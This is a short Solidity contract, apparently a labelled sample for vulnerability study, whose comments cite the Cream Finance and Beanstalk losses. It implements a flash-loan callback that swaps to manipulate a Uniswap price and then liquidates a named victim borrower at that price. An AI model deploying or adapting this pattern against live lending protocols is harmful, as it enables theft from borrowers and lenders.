// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IUniswapV2Pair {
    function swap(uint256, uint256, address, bytes calldata) external;
}
interface ILending {
    function liquidate(address borrower) external;
}
interface IERC20 {
    function transfer(address, uint256) external returns (bool);
}

// VULN: flashloan callback executes swap (moves price) then calls liquidate
// Loss ref: Cream Finance ~$130M, Oct 2021; Beanstalk ~$182M, Apr 2022
// https://rekt.news/cream-rekt-2/
// https://rekt.news/beanstalk-rekt/
contract FlashloanManipulatorVuln {
    ILending public lending;
    IUniswapV2Pair public pricePool;
    address public victimBorrower;

    constructor(address _lending, address _pool, address _victim) {
        lending = ILending(_lending);
        pricePool = IUniswapV2Pair(_pool);
        victimBorrower = _victim;
    }

    // VULN: swap (price manipulation) + liquidate in same flashloan callback
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // Step 1: swap to manipulate oracle price used by lending
        pricePool.swap(0, amount0 * 2, address(this), ""); // move price

        // Step 2: liquidate victim at manipulated price — in same callback
        lending.liquidate(victimBorrower); // price-sensitive, exploited above

        // Repay flashloan
        IERC20(address(pricePool)).transfer(msg.sender, amount0 + amount0 / 100);
    }
}
